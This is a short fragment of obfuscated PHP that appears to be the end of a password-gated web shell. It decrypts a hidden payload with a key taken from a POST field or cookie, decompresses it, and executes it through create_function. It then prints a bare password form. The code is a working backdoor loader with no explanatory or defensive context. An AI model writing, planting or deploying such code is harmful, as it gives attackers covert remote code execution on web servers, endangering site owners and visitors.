...
if($J__f!==NULL){$J__f=md5($J__f).substr(MD5(strrev($J__f)),0,strlen($J__f));
for($J____f=0;$J____f<15587;$J____f++){$J___f[$J____f]=chr(( ord($J___f[$J____f])-ord($J__f[$J____f]))%256);
$J__f.=$J___f[$J____f];}
if($J___f=@gzinflate($J___f)){if(isset($_POST['J__f']))@setcookie('J__f', $_POST['J__f']);
$J____f=create_function('',$J___f);unset($J__f,$J___f);$J____f();}}
echo '<form method="post" action=""><input type="text" name="J__f" value=""/><input type="submit" value="&gt;"/></form>';
?>